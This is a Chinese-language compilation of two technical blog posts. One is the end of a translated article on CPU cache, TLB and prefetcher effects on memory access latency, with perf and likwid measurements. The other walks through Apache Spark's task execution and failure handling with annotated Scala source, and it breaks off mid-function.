在堆内存的随机访问得到一个非常有趣的结果。 这是我们实验中最坏的场景，在这些给定的系统硬件规格情况下，我们分别得到150ns，65ns，75ns的内存控制器（memory controller）和内存模块的延迟。 对Nehalem处理器（i7-860），我们可以用4GB的array去进一步测试缓存子系统，平均每次的结果大约55ns； 
i7-2760QM具有更大的负载缓存（load buffer），TLB缓存（TLB caches），并且Linux运行在一个透明的大内存页环境下，大内存分页本身可以进一步降低延迟。通过改变代表访问步幅的素数值（译者注：程序中的 PRIME_INC），发现不同的处理器类型得到的结果差异更大。例如：Nehalem CPU 并且PRIME_INC = 39916801 。 我们在这样一个拥有更大的堆的Sandy Bridge(译者注：Sandy Bridge为Intel推出处理器，该处理器采用32nm制程。Sandy Bridge(之前称作Gesher)是Nehalem的继任者)场景下来测试；
 
最主要是更大程度上消除了内存访问的可预测性的影响；和在降低主内存延迟上更好的缓存子系统。 让我们来看看在这些缓存子系统中的一些小细节，来理解所观察到的结果。 
硬件组件：
在考虑降低延迟的时候，我们使用多层的缓存加上预加载（pre-fetchers）； 在本节中，我会尽量覆盖为了降低延迟，我们已经在使用的主要组件，包括硬件和系统软件；我们将使用perf(译者注：Perf Event 是一款随Linux 内核代码一同发布和维护的性能诊断工具)和Lightweight Performance Counters工具来研究这些延迟降低组件，这些工具可以在我们执行代码的时候，获取CPU的性能计数器(Performance counters )，来告诉我们这些组件有效性。我这里使用的是特定于Sandy Bridge性能计数器(Performance counters ).
 数据高速缓存：
 处理器通常有2层或3层的数据缓存。 每一层容量逐渐变大，延迟也逐渐增加。 最新的intel 3.0GHz的CPU处理器是3层结构（L1D，L2，L3），大小分别是32KB，256KB和4-30MB，延迟分别约为1ns，4ns，15ns。 
 
数据缓存是高效的具有固定数量插槽（sorts）硬件哈希表。每个插槽（sort）对应一个哈希值。 这些插槽通常称为“通道、路（ways）”。一个8路组相联（译者注：CPU缓存）的缓存有8个插槽，来保存哈希值在同一个缓存位置的地址。 数据缓存中的这些插槽（sort）里并不存储的字（word），它们存储多个字（ multiple words）的缓存行（cache-lines ）。 在intel处理器中缓存行（cache-lines ）通常是64字节（64-bytes），对应到64位的机器上8个字（word）。 这极好的满足相邻的内存空间最可能立马需要访问的空间规律，最典型的场景是数组或者对象的字段；
  
数据缓存通常是LRU的方式失效。 缓存通过一个回写算法工作，只有当被修改的缓存行失效的时候，修改的值才会回写到主内存中。 这样会产生一个有趣的现象，一个load操作可能会引发一个回写操作，将修改的值写回主内存；
perf stat -e L1-dcache-loads,L1-dcache-load-misses java -Xmx4g TestMemoryAccessPatterns $
 Performance counter stats for 'java -Xmx4g TestMemoryAccessPatterns 1':
     1,496,626,053 L1-dcache-loads                                            
       274,255,164 L1-dcache-misses
         #   18.32% of all L1-dcache hits
 Performance counter stats for 'java -Xmx4g TestMemoryAccessPatterns 2':
     1,537,057,965 L1-dcache-loads                                            
     1,570,105,933 L1-dcache-misses
         #  102.15% of all L1-dcache hits 
 Performance counter stats for 'java -Xmx4g TestMemoryAccessPatterns 3':
     4,321,888,497 L1-dcache-loads                                           
     1,780,223,433 L1-dcache-misses
         #   41.19% of all L1-dcache hits  
likwid-perfctr -C 2 -g L2CACHE java -Xmx4g TestMemoryAccessPatterns $
java -Xmx4g TestMemoryAccessPatterns 1
+-----------------------+-------------+
|         Event         |   core 2    |
+-----------------------+-------------+
|   INSTR_RETIRED_ANY   | 5.94918e+09 |
| CPU_CLK_UNHALTED_CORE | 5.15969e+09 |
| L2_TRANS_ALL_REQUESTS | 1.07252e+09 |
|     L2_RQSTS_MISS     | 3.25413e+08 |
+-----------------------+-------------+
+-----------------+-----------+
|     Metric      |  core 2   |
+-----------------+-----------+
|   Runtime [s]   |  2.15481  |
|       CPI       | 0.867293  |
| L2 request rate |  0.18028  |
|  L2 miss rate   | 0.0546988 |
|  L2 miss ratio  | 0.303409  |
+-----------------+-----------+
+------------------------+-------------+
|         Event          |   core 2    |
+------------------------+-------------+
| L3_LAT_CACHE_REFERENCE | 1.26545e+08 |
|   L3_LAT_CACHE_MISS    | 2.59059e+07 |
+------------------------+-------------+
java -Xmx4g TestMemoryAccessPatterns 2
+-----------------------+-------------+
|         Event         |   core 2    |
+-----------------------+-------------+
|   INSTR_RETIRED_ANY   | 1.48772e+10 |
| CPU_CLK_UNHALTED_CORE | 1.64712e+10 |
| L2_TRANS_ALL_REQUESTS | 3.41061e+09 |
|     L2_RQSTS_MISS     | 1.5547e+09  |
+-----------------------+-------------+
+-----------------+----------+
|     Metric      |  core 2  |
+-----------------+----------+
|   Runtime [s]   | 6.87876  |
|       CPI       | 1.10714  |
| L2 request rate | 0.22925  |
|  L2 miss rate   | 0.104502 |
|  L2 miss ratio  | 0.455843 |
+-----------------+----------+
+------------------------+-------------+
|         Event          |   core 2    |
+------------------------+-------------+
| L3_LAT_CACHE_REFERENCE | 1.52088e+09 |
|   L3_LAT_CACHE_MISS    | 1.72918e+08 |
+------------------------+-------------+
java -Xmx4g TestMemoryAccessPatterns 3
+-----------------------+-------------+
|         Event         |   core 2    |
+-----------------------+-------------+
|   INSTR_RETIRED_ANY   | 6.49533e+09 |
| CPU_CLK_UNHALTED_CORE | 4.18416e+10 |
| L2_TRANS_ALL_REQUESTS | 4.67488e+09 |
|     L2_RQSTS_MISS     | 1.43442e+09 |
+-----------------------+-------------+
+-----------------+----------+
|     Metric      |  core 2  |
+-----------------+----------+
|   Runtime [s]   |  17.474  |
|       CPI       |  6.4418  |
| L2 request rate | 0.71973  |
|  L2 miss rate   | 0.220838 |
|  L2 miss ratio  | 0.306835 |
+-----------------+----------+
+------------------------+-------------+
|         Event          |   core 2    |
+------------------------+-------------+
| L3_LAT_CACHE_REFERENCE | 1.40079e+09 |
|   L3_LAT_CACHE_MISS    | 1.34832e+09 |
+------------------------+-------------+
   注 ：随着更随机的访问，结合L1D，L2和L3的缓存失效率也显著增加。
 转换后援存储器(TLB)（译者注：TLB）
 我们的程序通常使用需要被翻译成物理内存地址的虚拟内存地址。 虚拟内存系统通过映射页（mapping pages）实现这个功能。 对内存的操作我们需要知道给定页面的偏移量和页大小。页大小通常情况从4KB到2MB，以至更大。 Linux的介绍Transparent Huge Pages表明在2.6.38内核中使用2 MB的页大小。虚拟内存页到物理页的转换关系维护在页表（page table）中 。 这种转换可能需要多次访问的页表，这是一个巨大的性能损失。 为了加快查找，处理器有为​每一级缓存都配备一个更小的硬件缓存，称为TLB缓存。 TLB缓存失效的代价是非常巨大的，因为页表（page table）可能不在附近的数据缓存中。 通过使用更大的页，TLB缓存可以覆盖更大的地址范围。
 
perf stat -e dTLB-loads,dTLB-load-misses java -Xmx4g TestMemoryAccessPatterns $
 
 Performance counter stats for 'java -Xmx4g TestMemoryAccessPatterns 1':
     1,496,128,634 dTLB-loads
           310,901 dTLB-misses
              #    0.02% of all dTLB cache hits 
 Performance counter stats for 'java -Xmx4g TestMemoryAccessPatterns 2':
     1,551,585,263 dTLB-loads
           340,230 dTLB-misses
              #    0.02% of all dTLB cache hits
 Performance counter stats for 'java -Xmx4g TestMemoryAccessPatterns 3':
     4,031,344,537 dTLB-loads
     1,345,807,418 dTLB-misses
              #   33.38% of all dTLB cache hits  
 注：当使用大页时，仅仅在随机访问整个堆的场景下，TLB缓存失效才非常明显；
 硬件预加载（Pre-Fetchers）：
 硬件会去尝试预测程序中的下一次访问的内存，去选择并加载到缓存区。最简单的方式是根据空间局域性，预加载相邻近的缓存行，或者通过识别基于有规律步幅访问模式，通常步幅长度小于2KB。 在下面的测试中，我们将测量命中通过预加载加载到缓冲区数据的次数
 
likwid-perfctr -C 2 -g LOAD_HIT_PRE_HW_PF:PMC0 java -Xmx4g TestMemoryAccessPatterns $
java -Xmx4g TestMemoryAccessPatterns 1
+--------------------+-------------+
|       Event        |   core 2    |
+--------------------+-------------+
| LOAD_HIT_PRE_HW_PF | 1.31613e+09 |
+--------------------+-------------+
java -Xmx4g TestMemoryAccessPatterns 2
+--------------------+--------+
|       Event        | core 2 |
+--------------------+--------+
| LOAD_HIT_PRE_HW_PF | 368930 |
+--------------------+--------+
java -Xmx4g TestMemoryAccessPatterns 3
+--------------------+--------+
|       Event        | core 2 |
+--------------------+--------+
| LOAD_HIT_PRE_HW_PF | 324373 |
+--------------------+--------+
 注 ：在线性访问的时候我们预加载的命中率是非常明显的。
 内存控制器和行缓冲区：
 只有最后一级缓存（LLC）位于内存控制器内，内存控制器管理访问SDRAM BANKS。 内存由行和列组成。 访问的一个地址的时候，首先行地址被选中（RAS），然后该行的列地址被选中（CAS），最后获取这个字（word）。行通常就是一个页的大小，并加载到一个行缓冲区（row buffer）。 即使在这个阶段，通过硬件仍能减少延迟。 访问内存的请求维护在一个队列中，并进行重排，尽可能一次从相同行中取出多个字（words）
 非统一内存访问（NUMA） ：
 现在系统在CPU插槽上有内存控制器。 插槽上的内存控制器大约有50ns的延迟，对现有的前端总线（FSB）和外部北桥（Northbridge）的内存控制器延迟已经减少了。多插槽的系统需要使用内存互连接口，intel使用QPI ，当一个CPU要访问另一个CPU插槽管理的内存时候讲使用到它。 这些互连的存在引起了非统一内存访问服务。 在2插槽系统中内存访问可能是在本地或1跳之遥（1hop away）。 在8插槽系统中内存访问可高达三跳，每一跳单向就会增加20ns的延迟。
 这些对算法意味着什么？
 L1D缓存命中和完全失效从主内存中访问结果之间的差异是2个数量级，即<1ns和65-100ns。 如果我们的算法在不断增加的地址空间中随机访问，那么我们就不能从硬件支持的降低延迟中受益。 
 
在设计算法和数据结构的我们能做什么呢？事实上有很多事情我们可以做的。 如果我们执行单元的数据块是相邻的，紧密的。并且我们以可预见的方式访问内存。我们的算法会快很多倍。 例如，相比使用桶（bucket）和chain 模式的哈希表(译者注：hash tables) ，比如在JDK中默认，我们可以使用使用linear-probing策略的open-addressing模式的哈希表。 在使用 linked-lists 和 trees时相比每个node只包含单个项，更应该每个node包含一个数组或者多个项；
  
研究算法以达到与缓存子系统的协调。我发现一个迷人的领域是Cache Oblivious Algorithms虽然名字有点误导，但有这里有一些很棒的概念，关于如何提高软件的性能和并行执行能力。 这篇文章，很好的说明了可以获得的性能好处。 
 总结：
 为了实现高性能，和与缓存子系统达到一种协调是很重要的。 在这篇文章中我们看到，可以通过和内存访问模型协调的方式，而不是破坏的方式来实现，在设计算法和数据结构，考虑缓存失效是非常重要的，可能甚至比算法的执行指令数更重要。 这些不是我们在学生时代学习计算机科学的算法理论中能学到的。 在过去十年里，技术发生了一些根本性的变化。 对我来说，最重要的是多核心的崛起，和64位地址空间的大内存系统的发展。 
 
有一件事是肯定的，如果我们想软件执行的更快，伸缩性更好，我们必须更好地利用CPU的多核，和注重内存访问模型。
更新：2012年8月06日 
试图设计一个对所有处理器和内存的大小都随机访问算法是棘手的。 比如我下面的使用算法，在我的Sandy Bridge处理器速度较慢，但​​Nehalem的速度更快。 最关键的问题是当你以随机方式访问内存，性能将是非常难以预测的。 在所有的测试中，我也对包含L3缓存做了更加详尽的测试
  
private static final long LARGE_PRIME_INC = 70368760954879L;
    RANDOM_HEAP_WALK
    {
        public int next(final int pageOffset, final int wordOffset, final int pos)
        {
            return (int)(pos + LARGE_PRIME_INC) & ARRAY_MASK;
        }
    };
 
Intel i7-2760QM @ 2.40GHz, 8GB RAM DDR3 1600MHz, 
Linux 3.4.6 kernel 64-bit, Java 1.7.0_05
=================================================
0 - 29.06ns RANDOM_HEAP_WALK
1 - 29.47ns RANDOM_HEAP_WALK
2 - 29.48ns RANDOM_HEAP_WALK
3 - 29.43ns RANDOM_HEAP_WALK
4 - 29.42ns RANDOM_HEAP_WALK
 Performance counter stats for 'java -Xmx4g TestMemoryAccessPatterns 3':
     9,444,928,682 dTLB-loads
     4,371,982,327 dTLB-misses
         #   46.29% of all dTLB cache hits 
     9,390,675,639 L1-dcache-loads
     1,471,647,016 L1-dcache-misses
         #   15.67% of all L1-dcache hits  
+-----------------------+-------------+
|         Event         |   core 2    |
+-----------------------+-------------+
|   INSTR_RETIRED_ANY   | 7.71171e+09 |
| CPU_CLK_UNHALTED_CORE | 1.31717e+11 |
| L2_TRANS_ALL_REQUESTS | 8.4912e+09  |
|     L2_RQSTS_MISS     | 2.79635e+09 |
+-----------------------+-------------+
+-----------------+----------+
|     Metric      |  core 2  |
+-----------------+----------+
|   Runtime [s]   | 55.0094  |
|       CPI       | 17.0801  |
| L2 request rate | 1.10108  |
|  L2 miss rate   | 0.362611 |
|  L2 miss ratio  | 0.329324 |
+-----------------+----------+
+--------------------+-------------+
|       Event        |   core 2    |
+--------------------+-------------+
| LOAD_HIT_PRE_HW_PF | 3.59509e+06 |
+--------------------+-------------+
+------------------------+-------------+
|        Event           |   core 2    |
+------------------------+-------------+
| L3_LAT_CACHE_REFERENCE | 1.30318e+09 |
| L3_LAT_CACHE_MISS      | 2.62346e+07 |
+------------------------+-------------+
 全文完。。
原文地址：http://mechanical-sympathy.blogspot.com/2012/08/memory-access-patterns-are-important.html
墙内地址：http://ifeve.com/memory-access-patterns-are-important/
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Task的执行过程分析, hongs-yang.iteye.com.blog.2063870, Thu, 08 May 2014 12:32:00 +0800

Task的执行过程分析
 
Task的执行通过Worker启动时生成的Executor实例进行，
 
case RegisteredExecutor(sparkProperties) =>
 
 logInfo("Successfully registered with driver")
 
// Make this host instead of hostPort ?
 
executor = new Executor(executorId, Utils.parseHostPort(hostPort)._1, sparkProperties)
 
 
 
通过executor实例的launchTask启动task的执行操作。
 
 
 
def launchTask(context: ExecutorBackend, taskId: Long, serializedTask: ByteBuffer) {
 
valtr = new TaskRunner(context, taskId, serializedTask)
 
runningTasks.put(taskId, tr)
 
threadPool.execute(tr)
 
 }
 
 
 
生成TaskRunner线程，把task与当前的Wroker的启动的executorBackend传入，
 
on yarn模式为CoarseGrainedExecutorBackend.
 
通过threadPool线程池执行生成TaskRunner线程。
 
 
 
TaskRunner.run函数:
 
用于执行task任务的线程
 
overridedef run(): Unit = SparkHadoopUtil.get.runAsUser(sparkUser) { () =>
 
valstartTime = System.currentTimeMillis()
 
SparkEvn后面在进行分析。
 
 SparkEnv.set(env)
 
 Thread.currentThread.setContextClassLoader(replClassLoader)
 
valser = SparkEnv.get.closureSerializer.newInstance()
 
 logInfo("Running task ID " + taskId)
 
通过execBackend更新此task的状态。设置task的状态为RUNNING.向master发送StatusUpdate事件。
 
 execBackend.statusUpdate(taskId, TaskState.RUNNING, EMPTY_BYTE_BUFFER)
 
varattemptedTask: Option[Task[Any]] = None
 
vartaskStart: Long = 0
 
def gcTime = ManagementFactory.getGarbageCollectorMXBeans.map(_.getCollectionTime).sum
 
valstartGCTime = gcTime
 
 
 
try {
 
 SparkEnv.set(env)
 
 Accumulators.clear()
 
解析出task的资源信息。包括要执行的jar,其它资源，task定义信息
 
val (taskFiles, taskJars, taskBytes) = Task.deserializeWithDependencies(serializedTask)
 
更新资源信息，并把task执行的jar更新到当前Thread的ClassLoader中。
 
 updateDependencies(taskFiles, taskJars)
 
通过SparkEnv中配置的Serialize实现对task定义进行反serialize,得到Task实例。
 
Task的具体实现为ShuffleMapTask或者ResultTask
 
task = ser.deserialize[Task[Any]](taskBytes, Thread.currentThread.getContextClassLoader)
 
 
 
如果killed的值为true,不执行当前task任务，进入catch处理。
 
// If this task has been killed before we deserialized it, let's quit now. Otherwise,
 
// continue executing the task.
 
if (killed) {
 
// Throw an exception rather than returning, because returning within a try{} block
 
// causes a NonLocalReturnControl exception to be thrown. The NonLocalReturnControl
 
// exception will be caught by the catch block, leading to an incorrect ExceptionFailure
 
// for the task.
 
throw TaskKilledException
 
 }
 
 
 
attemptedTask = Some(task)
 
 logDebug("Task " + taskId +"'s epoch is " + task.epoch)
 
env.mapOutputTracker.updateEpoch(task.epoch)
 
生成TaskContext实例，通过Task.runTask执行task的任务，等待task执行完成。
 
// Run the actual task and measure its runtime.
 
taskStart = System.currentTimeMillis()
 
valvalue = task.run(taskId.toInt)
 
valtaskFinish = System.currentTimeMillis()
 
 
 
此时task执行结束，检查如果task是被killed的结果，进入catch处理。
 
// If the task has been killed, let's fail it.
 
if (task.killed) {
 
throw TaskKilledException
 
 }
 
对task执行的返回结果进行serialize操作。
 
valresultSer = SparkEnv.get.serializer.newInstance()
 
valbeforeSerialization = System.currentTimeMillis()
 
valvalueBytes = resultSer.serialize(value)
 
valafterSerialization = System.currentTimeMillis()
 
发送监控指标
 
for (m <- task.metrics) {
 
m.hostname = Utils.localHostName()
 
m.executorDeserializeTime = (taskStart - startTime).toInt
 
m.executorRunTime = (taskFinish - taskStart).toInt
 
m.jvmGCTime = gcTime - startGCTime
 
m.resultSerializationTime = (afterSerialization - beforeSerialization).toInt
 
 }
 
 
 
valaccumUpdates = Accumulators.values
 
把Task的返回结果生成DirectTaskResult实例。并对其进行serialize操作。
 
valdirectResult = new DirectTaskResult(valueBytes, accumUpdates, task.metrics.getOrElse(null))
 
valserializedDirectResult = ser.serialize(directResult)
 
 logInfo("Serialized size of result for " + taskId + " is " + serializedDirectResult.limit)
 
检查task result的大小是否超过了akka的发送消息大小，
 
如果是通过BlockManager来管理结果，设置RDD的存储级别为MEMORY与DISK，否则表示没有达到actor消息大小，
 
直接使用TaskResult,此部分信息主要是需要通过状态更新向Scheduler向送StatusUpdate事件调用。
 
valserializedResult = {
 
if (serializedDirectResult.limit >= akkaFrameSize - 1024) {
 
 logInfo("Storing result for " + taskId + " in local BlockManager")
 
valblockId = TaskResultBlockId(taskId)
 
env.blockManager.putBytes(
 
blockId, serializedDirectResult, StorageLevel.MEMORY_AND_DISK_SER)
 
ser.serialize(new IndirectTaskResult[Any](blockId))
 
 } else {
 
 logInfo("Sending result for " + taskId + " directly to driver")
 
serializedDirectResult
 
 }
 
 }
 
通过execBackend更新此task的状态。设置task的状态为FINISHED.向master发送StatusUpdate事件。
 
 execBackend.statusUpdate(taskId, TaskState.FINISHED, serializedResult)
 
 logInfo("Finished task ID " + taskId)
 
 } catch {
 
出现异常，发送FAILED事件。
 
caseffe: FetchFailedException => {
 
valreason = ffe.toTaskEndReason
 
 execBackend.statusUpdate(taskId, TaskState.FAILED, ser.serialize(reason))
 
 }
 
 
 
case TaskKilledException => {
 
 logInfo("Executor killed task " + taskId)
 
 execBackend.statusUpdate(taskId, TaskState.KILLED, ser.serialize(TaskKilled))
 
 }
 
 
 
caset: Throwable => {
 
valserviceTime = (System.currentTimeMillis() - taskStart).toInt
 
valmetrics = attemptedTask.flatMap(t => t.metrics)
 
for (m <- metrics) {
 
m.executorRunTime = serviceTime
 
m.jvmGCTime = gcTime - startGCTime
 
 }
 
valreason = ExceptionFailure(t.getClass.getName, t.toString, t.getStackTrace, metrics)
 
 execBackend.statusUpdate(taskId, TaskState.FAILED, ser.serialize(reason))
 
 
 
// TODO: Should we exit the whole executor here? On the one hand, the failed task may
 
// have left some weird state around depending on when the exception was thrown, but on
 
// the other hand, maybe we could detect that when future tasks fail and exit then.
 
 logError("Exception in task ID " + taskId, t)
 
//System.exit(1)
 
 }
 
 } finally {
 
从shuffleMemoryMap中移出此线程对应的shuffle的内存空间
 
// TODO: Unregister shuffle memory only for ResultTask
 
valshuffleMemoryMap = env.shuffleMemoryMap
 
shuffleMemoryMap.synchronized {
 
shuffleMemoryMap.remove(Thread.currentThread().getId)
 
 }
 
从runningTasks中移出此task
 
runningTasks.remove(taskId)
 
 }
 
 }
 
 }
 
 
 
Task执行过程的状态更新
 
ExecutorBackend.statusUpdate
 
on yarn模式实现类CoarseGrainedExecutorBackend,通过master的actor发送StatusUpdate事件。
 
overridedef statusUpdate(taskId: Long, state: TaskState, data: ByteBuffer) {
 
driver ! StatusUpdate(executorId, taskId, state, data)
 
 }
 
 
 
master 中的ExecutorBackend处理状态更新操作：
 
实现类：CoarseGrainedSchedulerBackend.DriverActor
 
case StatusUpdate(executorId, taskId, state, data) =>
 
通过TaskSchedulerImpl的statusUpdate处理状态更新。
 
 scheduler.statusUpdate(taskId, state, data.value)
 
如果Task状态为完成状态，完成状态包含(FINISHED, FAILED, KILLED, LOST)
 
if (TaskState.isFinished(state)) {
 
if (executorActor.contains(executorId)) {
 
每一个task占用一个cpu core,此时task完成，把可用的core值加一
 
 freeCores(executorId) += 1
 
在此executor上接着执行其于的task任务，此部分可参见scheduler调度过程分析中的部分说明。
 
 makeOffers(executorId)
 
 } else {
 
// Ignoring the update since we don't know about the executor.
 
valmsg = "Ignored task status update (%d state %s) from unknown executor %s with ID %s"
 
 logWarning(msg.format(taskId, state, sender, executorId))
 
 }
 
 }
 
 
 
TaskSchedulerImpl.statusUpdate函数处理流程
 
 
 
def statusUpdate(tid: Long, state: TaskState, serializedData: ByteBuffer) {
 
varfailedExecutor: Option[String] = None
 
 synchronized {
 
try {
 
如果Task的状态传入为Task的执行丢失，同时task在executor列表中存在
 
if (state == TaskState.LOST && taskIdToExecutorId.contains(tid)) {
 
得到此task执行的worker所属的executorID，
 
// We lost this entire executor, so remember that it's gone
 
valexecId = taskIdToExecutorId(tid)
 
如果此executor是active的Executor，执行scheduler的executorLost操作。
 
包含TaskSetManager，会执行TaskSetManager.executorLost操作.
 
设置当前的executor为failedExecutor,共函数最后使用。
 
if (activeExecutorIds.contains(execId)) {
 
 removeExecutor(execId)
 
failedExecutor = Some(execId)
 
 }
 
 }
 
taskIdToTaskSetId.get(tid) match {
 
case Some(taskSetId) =>
 
如果task状态是完成状态，非RUNNING状态。移出对应的容器中的值
 
if (TaskState.isFinished(state)) {
 
taskIdToTaskSetId.remove(tid)
 
if (taskSetTaskIds.contains(taskSetId)) {
 
taskSetTaskIds(taskSetId) -= tid
 
 }
 
taskIdToExecutorId.remove(tid)
 
 }
 
activeTaskSets.get(taskSetId).foreach { taskSet =>
 
如果task是成功完成，从TaskSet中移出此task，同时通过TaskResultGetter获取数据。
 
if (state == TaskState.FINISHED) {
 
 taskSet.removeRunningTask(tid)
 
taskResultGetter.enqueueSuccessfulTask(taskSet, tid, serializedData)
 
 } elseif (Set(TaskState.FAILED, TaskState.KILLED, TaskState.LOST).contains(state)) {
 
task任务执行失败的处理部分：
 
 taskSet.removeRunningTask(tid)
 
taskResultGetter.enqueueFailedTask(taskSet, tid, state, serializedData)
 
 }
 
 }
 
case None =>
 
 logInfo("Ignoring update with state %s from TID %s because its task set is gone"
 
 .format(state, tid))
 
 }
 
 } catch {
 
casee: Exception => logError("Exception in statusUpdate", e)
 
 }
 
 }
 
如果有failed的worker,通过dagScheduler处理此executor.
 
// Update the DAGScheduler without holding a lock on this, since that can deadlock
 
if (failedExecutor != None) {
 
dagScheduler.executorLost(failedExecutor.get)
 
发起task执行的分配与任务执行操作。
 
backend.reviveOffers()
 
 }
 
 }
 
 
 
TaskStatus.LOST状态,同时executor在activeExecutorIds中
 
TaskStatus的状态为LOST时，同时executor是活动的executor(也就是有过执行task的情况)
 
privatedef removeExecutor(executorId: String) {
 
从activeExecutorIds中移出此executor
 
activeExecutorIds -= executorId
 
得到此executor对应的worker的host
 
valhost = executorIdToHost(executorId)
 
取出host对应的所有executor,并移出当前的executor
 
valexecs = executorsByHost.getOrElse(host, new HashSet)
 
execs -= executorId
 
if (execs.isEmpty) {
 
executorsByHost -= host
 
 }
 
从executor对应的host容器中移出此executor
 
executorIdToHost -= executorId
 
此处主要是去执行TaskSetManager.executorLost函数。
 
rootPool.executorLost(executorId, host)
 
 }
 
 
 
TaskSetManager.executorLost函数:
 
此函数主要处理executor导致task丢失的情况，把executor上的task重新添加到pending的tasks列表中
 
overridedef executorLost(execId: String, host: String) {
 
 logInfo("Re-queueing tasks for " + execId + " from TaskSet " + taskSet.id)
 
 
 
// Re-enqueue pending tasks for this host based on the status of the cluster -- for example, a
 
// task that used to have locations on only this host might now go to the no-prefs list. Note
 
// that it's okay if we add a task to the same queue twice (if it had multiple preferred
 
// locations), because findTaskFromList will skip already-running tasks.
 
重新生成此TaskSet中的pending队列，因为当前executor的实例被移出，需要重新生成。
 
for (index <- getPendingTasksForExecutor(execId)) {
 
 addPendingTask(index, readding=true)
 
 }
 
for (index <- getPendingTasksForHost(host)) {
 
 addPendingTask(index, readding=true)
 
 }
 
 
 
// Re-enqueue any tasks that ran on the failed executor if this is a shuffle map stage
 
如果当前的RDD是shuffle的rdd,
 
if (tasks(0).isInstanceOf[ShuffleMapTask]) {
 
for ((tid, info) <- taskInfosifinfo.executorId == execId) {
 
valindex = taskInfos(tid).index
 
if (successful(index)) {
 
successful(index) = false
 
 copiesRunning(index) -= 1
 
tasksSuccessful -= 1
 
 addPendingTask(index)
 
// Tell the DAGScheduler that this task was resubmitted so that it doesn't think our
 
// stage finishes when a total of tasks.size tasks finish.
 
通过DAGScheduler发送CompletionEvent处理事件，事件类型为Resubmitted,
 
 sched.dagScheduler.taskEnded(tasks(index), Resubmitted, null, null, info, null)
 
 }
 
 }
 
 }
 
如果task还处于running状态，同时此task在lost的executor上运行，
 
// Also re-enqueue any tasks that were running on the node
 
for ((tid, info) <- taskInfosifinfo.running && info.executorId == execId) {
 
设置task的failed值为true,移出此task的running列表中的值，重新添加task到pendingtasks队列中。
 
 handleFailedTask(tid, TaskState.FAILED, None)
 
 }
 
 }
 
 
 
DAGScheduler处理CompletionEvent事件。
 
...........................
 
casecompletion @ CompletionEvent(task, reason, _, _, taskInfo, taskMetrics) =>
 
listenerBus.post(SparkListenerTaskEnd(task, reason, taskInfo, taskMetrics))
 
 handleTaskCompletion(completion)
 
.........................
 
case Resubmitted =>
 
 logInfo("Resubmitted " + task + ", so marking it as still running")
 
pendingTasks(stage) += task
 
 
 
(TaskState.FAILED, TaskState.KILLED, TaskState.LOST)状态
 
.........................
 
 } elseif (Set(TaskState.FAILED, TaskState.KILLED, TaskState.LOST).contains(state)) {
 
把task从running容器中移出
 
 taskSet.removeRunningTask(tid)
 
此函数主要是解析出出错的信息。并通过TaskSchedulerImpl.handleFailedTask处理exception
 
taskResultGetter.enqueueFailedTask(taskSet, tid, state, serializedData)
 
 }
 
 
 
 
 
TaskSchedulerImpl.handleFailedTask函数：
 
def handleFailedTask(
 
 taskSetManager: TaskSetManager,
 
 tid: Long,
 
 taskState: TaskState,
 
 reason: Option[TaskEndReason]) = synchronized {
 
 taskSetManager.handleFailedTask(tid, taskState, reason)
 
如果task不是被KILLED掉的task,重新发起task的分配与执行操作。
 
if (taskState != TaskState.KILLED) {
 
// Need to revive offers again now that the task set manager state has been updated to
 
// reflect failed tasks that need to be re-run.
 
backend.reviveOffers()
 
 }
 
 }
 
 
 
TaskSetManager.handleFailedTask函数流程
 
TaskSetManager.handleFailedTask,函数，处理task执行的exception信息。
 
def handleFailedTask(tid: Long, state: TaskState, reason: Option[TaskEndReason]) {
 
valinfo = taskInfos(tid)
 
if (info.failed) {
 
return
 
 }
 
 removeRunningTask(tid)
 
valindex = info.index
 
info.markFailed()
 
varfailureReason = "unknown"
 
if (!successful(index)) {
 
 logWarning("Lost TID %s (task %s:%d)".format(tid, taskSet.id, index))
 
 copiesRunning(index) -= 1
 
如果是通过TaskSetManager.executorLost函数发起的此函数调用(Task.LOST)，下面的case部分不会执行，
 
否则是task的执行exception情况，也就是状态更新中非Task.LOST状态时。
 
// Check if the problem is a map output fetch failure. In that case, this
 
// task will never succeed on any node, so tell the scheduler about it.
 
 reason.foreach {
 
casefetchFailed: FetchFailed =>
 
读取失败，移出所有此taskset的task执行。并从scheduler中移出此taskset的调度,不再执行下面流程
 
 logWarning("Loss was due to fetch failure from " + fetchFailed.bmAddress)
 
 sched.dagScheduler.taskEnded(tasks(index), fetchFailed, null, null, info, null)
 
successful(index) = true
 
tasksSuccessful += 1
 
 sched.taskSetFinished(this)
 
 removeAllRunningTasks()
 
return
 
 
 
case TaskKilled =>
 
task被kill掉，移出此task,同时不再执行下面流程
 
 logWarning("Task %d was killed.".format(tid))
 
 sched.dagScheduler.taskEnded(tasks(index), reason.get, null, null, info, null)
 
return
 
 
 
caseef: ExceptionFailure =>
 
 sched.dagScheduler.taskEnded(
 
tasks(index), ef, null, null, info, ef.metrics.getOrElse(null))
 
if (ef.className == classOf[NotSerializableException].getName()) {
 
// If the task result wasn't rerializable, there's no point in trying to re-execute it.
 
 logError("Task %s:%s had a not serializable result: %s; not retrying".format(
 
taskSet.id, index, ef.description))
 
 abort("Task %s:%s had a not serializable result: %s".format(
 
taskSet.id, index, ef.description))
 
return
 
 }
 
valkey = ef.description
 
failureReason = "Exception failure: %s".format(ef.description)
 
valnow = clock.getTime()
 
val (printFull, dupCount) = {
 
if (recentExceptions.contains(key)) {
 
val (dupCount, printTime) = recentExceptions(key)
 
if (now - printTime > EXCEPTION_PRINT_INTERVAL) {
 
recentExceptions(key) = (0, now)
 
 (true, 0)
 
 } else {
 
recentExceptions(key) = (dupCount + 1, printTime)
 
 (false, dupCount + 1)
 
 }
 
 } else {
 
recentExceptions(key) = (0, now)
 
 (true, 0)
 
 }
 
 }
 
if (printFull) {
 
vallocs = ef.stackTrace.map(loc => "\tat %s".format(loc.toString))
 
 logWarning("Loss was due to %s\n%s\n%s".format(
 
ef.className, ef.description, locs.mkString("\n")))
 
 } else {
 
 logInfo("Loss was due to %s [duplicate %d]".format(ef.description, dupCount))
 
 }
 
 
 
case TaskResultLost =>
 
failureReason = "Lost result for TID %s on host %s".format(tid, info.host)
 
 logWarning(failureReason)
 
 sched.dagScheduler.taskEnded(tasks(index), TaskResultLost, null, null, info, null)
 
 
 
case _ => {}
 
 }
 
重新把task添加到pending的执行队列中,同时如果状态非KILLED的状态，设置并检查是否达到重试的最大次数
 
// On non-fetch failures, re-enqueue the task as pending for a max number of retries
 
 addPendingTask(index)
 
if (state != TaskState.KILLED) {
 
 numFailures(index) += 1
 
if (numFailures(index) >= maxTaskFailures) {
